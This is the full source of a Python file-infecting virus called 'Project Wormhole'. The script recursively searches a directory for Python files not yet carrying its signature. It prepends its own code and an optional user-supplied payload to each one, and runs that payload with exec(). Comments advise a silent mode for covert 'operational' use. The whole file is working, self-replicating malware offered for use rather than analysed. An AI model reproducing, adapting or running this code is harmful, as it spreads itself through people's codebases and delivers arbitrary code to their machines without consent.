#!/usr/bin/python3
#
# Regards, the Alveare Solutions society.
#
import os
import datetime
import pysnooper
import optparse

# [ NOTE ]: Only the default values set here propagate to infected files, along
#           with the payload.
# [ NOTE ]: Values set by command line arguments are only used for the initial
#           execution of wormhole.py.
SIGNATURE = "init_project_wormhole()"
silent_flag = 'off' # [ NOTE ]: Keep on in an operational environment.
running_mode = 0
victim_directory = os.path.abspath("")
code_insertion_mode = 'append' # (write | insert | append)

# FETCHERS

def fetch_file_content_as_string(file_path, line_range):
    try:
        file_obj = open(os.path.abspath(file_path))
    except Exception as e:
        stdout_msg('[ ! ]: Could not open file ({}).'.format(file_path))
        return
    file_content_string = ""
    # [ NOTE ]: Scan current file line range
    for line_number, line in enumerate(file_obj):
        if line_number >= line_range[0] and line_number < line_range[1]:
            file_content_string += line
    file_obj.close()
    return file_content_string

def fetch_number_of_lines_in_file(file_path):
    try:
        return len(open(str(file_path)).readlines())
    except Exception as e:
        stdout_msg(
            '[ ! ]: Could not fetch file ({}) line count.'.format(file_path)
        )
        return 0

# SCANNER CLIP

scanner_file = {
    'wormhole': __file__,
    'payload': '',
    'victim': '',
}

scanner_line_range = {
    'wormhole': (0, fetch_number_of_lines_in_file(scanner_file['wormhole'])),
    'payload': (0, 0),
    'victim': (0, 0),
}

scanned_code = {
    'wormhole': fetch_file_content_as_string(
        scanner_file['wormhole'], scanner_line_range['wormhole']
    ),
    'payload': '',
    'victim': '',
}

# SETTERS

def set_code_insertion_mode(mode):
    global code_insertion_mode
    if mode not in ('write', 'insert', 'append'):
        stdout_msg(
            '[ ! ]: Invalid payload code insertion mode ({}).'.format(mode)
        )
        return False
    stdout_msg(
        '[ + ]: Setup payload code insertion mode ({}).'.format(mode)
    )
    code_insertion_mode = mode
    return True

def set_victim_directory(dir_path):
    global victim_directory
    victim_directory = dir_path
    stdout_msg(
        '[ + ]: Loaded victim directory ({}).'.format(dir_path)
    )
    return True

def set_wormhole_scanner_file(file_path):
    global scanner_file
    scanner_file['wormhole'] = file_path
    stdout_msg(
        '[ + ]: Loaded wormhole file ({}).'.format(file_path)
    )
    return True

def set_payload_scanner_file(file_path):
    global scanner_file
    scanner_file['payload'] = file_path
    stdout_msg(
        '[ + ]: Loaded payload file ({}).'.format(file_path)
    )
    return True

def set_victim_scanner_file(file_path):
    global scanner_file
    scanner_file['victim'] = file_path
    stdout_msg(
        '[ + ]: Loaded victim file ({}).'.format(file_path)
    )
    return True

def set_wormhole_scanner_line_range(file_path=None, start=0, end=0):
    global scanner_line_range
    scanner_line_range['wormhole'] = (
        start, end or fetch_number_of_lines_in_file(file_path)
    )
    stdout_msg(
        '[ + ]: Indexed wormhole file line range {}.'.format(
            scanner_line_range['wormhole']
        )
    )
    return True

def set_payload_scanner_line_range(file_path=None, start=0, end=0, mode='write'):
    global scanner_line_range
    if mode == 'write':
        scanner_line_range['payload'] = (
            start, end or fetch_number_of_lines_in_file(file_path)
        )
    else:
        start_line = scanner_line_range['payload'][0]
        end_line = scanner_line_range['payload'][1]
        extra_lines = end - start
        scanner_line_range['payload'] = (
            start_line, end_line + extra_lines
        )
    stdout_msg(
        '[ + ]: Indexed payload line range {}.'.format(
            scanner_line_range['payload']
        )
    )
    return True

def set_victim_scanner_line_range(file_path=None, start=0, end=0):
    global scanner_line_range
    scanner_line_range['victim'] = (
        start, end or fetch_number_of_lines_in_file(file_path)
    )
    stdout_msg(
        '[ + ]: Indexed victim file line range {}.'.format(
            scanner_line_range['victim']
        )
    )
    return True

def set_wormhole_scanned_code(code_string=None):
    global scanned_code
    scanned_code['wormhole'] = code_string \
        if isinstance(code_string, str) \
        else fetch_file_content_as_string(
            scanner_file['wormhole'], scanner_line_range['wormhole']
        )
    stdout_msg(
        '[ + ]: Loaded ({}) character wormhole code.'.format(
            len(code_string)
        )
    )
    return True

def set_payload_scanned_code(code_string=None, mode='write'):
    global scanned_code
    if mode == 'write':
        scanned_code['payload'] = code_string \
            if isinstance(code_string, str) \
            else fetch_file_content_as_string(
                scanner_file['payload'], scanner_line_range['payload']
            )
    elif mode == 'append':
        tmp = scanned_code['payload'] + code_string
        scanned_code['payload'] = tmp
    elif mode == 'insert':
        tmp = code_string + scanned_code['payload']
        scanned_code['payload'] = tmp
    else:
        stdout_msg('[ ! ]: Invalid mode ({}).'.format(mode))
        return False
    stdout_msg(
        '[ + ]: Loaded ({}) character payload.'.format(
            len(code_string)
        )
    )
    return True

def set_victim_scanned_code(code_string=None):
    global scanned_code
    scanned_code['victim'] = code_string \
        if isinstance(code_string, str) \
        else fetch_file_content_as_string(
            scanner_file['victim'], scanner_line_range['victim']
        )
    stdout_msg(
        '[ + ]: Loaded ({}) character victim code.'.format(
            len(code_string)
        )
    )
    return True

# SEARCH

#@pysnooper.snoop()
def search(path):
    files_to_infect, file_list = [], os.listdir(path)
    for file_name in file_list:
        # [ NOTE ]: Check if file is a directory
        if os.path.isdir(path + "/" + file_name):
            # [ NOTE ]: Recursive call to search() for each directory in path
            files_to_infect.extend(search(path + "/" + file_name))
        # [ NOTE ]: Check for python files by extension
        elif file_name[-3:] == ".py":
            infected = False
            # [ NOTE ]: Scan python file content to check if infected
            for line in open(path + "/" + file_name):
                if SIGNATURE in line:
                    infected = True
                    break
            # [ NOTE ]: If file is not yet infected, add to return value
            if infected is False:
                files_to_infect.append(path + "/" + file_name)
    return files_to_infect

# INFECT

def infect(files_to_infect):
    if running_mode == 1:
        viral_infection = scanned_code['wormhole'] \
            + '\n' + scanned_code['payload']
    elif running_mode == 0:
        viral_infection = scanned_code['wormhole']
    else:
        stdout_msg("[ ! ]: Invalid running mode ({}).".format(running_mode))
        return False
    infected = infect_files(viral_infection, files_to_infect)
    return True

def infect_files(viral_infection, files_to_infect):
    processed_count, file_count = 0, len(files_to_infect)
    for file_name in files_to_infect:
        target_file = open(file_name, 'r')
        original_file_content = target_file.read()
        target_file.close()
        target_file = open(file_name,'w')
        target_file.write(viral_infection + original_file_content)
        target_file.close()
        processed_count += 1
        stdout_msg(
            '[PWN]: Infected python file ({}).'.format(file_name)
        )
    stdout_msg(
        '[PWN]: Infected ({}/{}) files using payload of ({}) characters.'.format(
            processed_count, file_count, len(viral_infection)
        )
    )
    return files_to_infect

# PROCESSORS

def process_code_insertion_mode_argument(parser, options):
    insertion_mode = options.insertion_mode
    if insertion_mode is None:
        stdout_msg(
            '[ ! ]: No payload code insertion mode found. '
            'Defaulting to ({}).'.format(code_insertion_mode)
        )
        return False
    set_mode = set_code_insertion_mode(insertion_mode)
    return True

def process_search_directory_argument(parser, options):
    search_dir = options.search_directory
    if search_dir is None:
        stdout_msg(
            '[ ! ]: No search directory path found. '
            'Defaulting to ({}).'.format(victim_directory)
        )
        return False
    set_search_dir = set_victim_directory(search_dir)
    return True

#@pysnooper.snoop()
def process_payload_code_argument(parser, options):
    global code_insertion_mode
    payload_code = options.payload_code
    if payload_code is None:
        stdout_msg(
            '[ ! ]: No payload code string found. '
            'Defaulting to ({}).'.format(scanned_code['payload'])
        )
        return False
    set_line_range = set_payload_scanner_line_range(
        start=0, end=payload_code.count('\n') + 1, mode=code_insertion_mode
    )
    set_payload_code = set_payload_scanned_code(
        code_string=payload_code, mode=code_insertion_mode
    )
    return True

def process_command_line_options(parser):
    (options, args) = parser.parse_args()
    # [ NOTE ]: If you trully want to be covert, process silent_flag first
    stdout_msg('[...]: Processing CLI options:')
    processed = {
        'silent_flag': process_silent_flag_argument(parser, options),
        'code_insertion_mode': process_code_insertion_mode_argument(parser, options),
        'payload_file': process_payload_file_argument(parser, options),
        'payload_code': process_payload_code_argument(parser, options),
        'search_directory': process_search_directory_argument(parser, options),
    }
    stdout_msg('[...]: CLI options processing summary:')
    for key, value in processed.items():
        stdout_msg("[ . ]: {} -> {}".format(key, value))
    return False if not processed['payload_file'] else processed

def process_payload_file_argument(parser, options):
    payload_file = options.payload_file
    if payload_file is None:
        stdout_msg(
            '[ ! ]: No payload file path found. '
            'Defaulting to ({}).'.format(scanner_file['payload'])
        )
        return False
    set_payload_file = set_payload_scanner_file(payload_file)
    set_line_range = set_payload_scanner_line_range(file_path=payload_file)
    set_payload_code = set_payload_scanned_code(
        code_string=fetch_file_content_as_string(
            payload_file, scanner_line_range['payload']
        )
    )
    return True

def process_silent_flag_argument(parser, options):
    global silent_flag
    flag = options.silent
    if flag is None:
        stdout_msg(
            '[ ! ]: No silent flag provided. '
            'Defaulting to ({}).'.format(silent_flag)
        )
        return False
    silent_flag = flag
    stdout_msg(
        '[ + ]: Silent flag setup ({}).'.format(silent_flag)
    )
    return True

# GENERAL

def payload():
    if running_mode == 0:
        return str()
    stdout_msg(
        '[ X ]: Executing payload code: \n{}'.format(scanned_code['payload'])
    )
    exec(scanned_code['payload'])
    return scanned_code['payload']

def stdout_msg(message):
    if silent_flag == 'on':
        return False
    elif silent_flag == 'off':
        print(message)
        return True
    return False

def create_command_line_parser():
    parser = optparse.OptionParser(
        '%prog \ \n'
        '   -p <payload-file-path                value-(/file/path.py)> \\\n'
        '   -c <payload-code-string              value-(python code)> \\\n'
        '   -s <silent-stdout-flag               value-(on | off)> \\\n'
        '   -d <directory-to-search-in           value-(/directory/path)> \\\n'
        '   -m <code-insertion-mode implies-(-c) value-(write | insert | append)>'
    )
    return parser

# PARSERS

def add_command_line_parser_options(parser):
    parser.add_option(
        '-p', dest='payload_file', type='string',
        help='Absolute payload /file/path.py.'
    )
    parser.add_option(
        '-s', dest='silent', type='string',
        help='STDOUT silence flag (on | off).'
    )
    parser.add_option(
        '-c', dest='payload_code', type='string',
        help='Python code string to use as payload.'
    )
    parser.add_option(
        '-d', dest='search_directory', type='string',
        help='Directory in which to search for python files to infect.'
    )
    parser.add_option(
        '-m', dest='insertion_mode', type='string',
        help='Dictates if the code from (-c) is executed instead of, '
             'before or after the code from (-p).'
    )
    return parser

#@pysnooper.snoop()
def parse_command_line_arguments():
    parser = create_command_line_parser()
    add_parser_options = add_command_line_parser_options(parser)
    return process_command_line_options(parser)

# DISPLAY

def display_header():
    stdout_msg('''
____________________________________________________________________________

 *            *           *   Project Wormhole   *           *            *
____________________________________________________________________________
                   Regards, the Alveare Solutions society.
    ''')
    return True

# INIT

def init_project_wormhole():
    global running_mode
    display_header()
    set_wormhole_scanner_line_range(file_path=__file__)
    parse_cli = parse_command_line_arguments()
    if parse_cli:
        running_mode = 1
    stdout_msg(
        '[///]: Arming Wormhole, running mode ({})...'.format(running_mode)
    )
    # [ NOTE ]: Search for python files to infect from current directory down
    files_to_infect = search(victim_directory)
    if files_to_infect:
        tag = '[ + ]: '
    else:
        tag = '[ - ]: '
    stdout_msg('{}Files to infect: {}'.format(tag, files_to_infect))
    if files_to_infect:
        file_infection = infect(files_to_infect)
    return True

# MISCELLANEOUS

try:
    init_project_wormhole()
except Exception as e:
    stdout_msg('[ ! ]: Wormhole failure. Details: ({})'.format(e))


# CODE DUMP


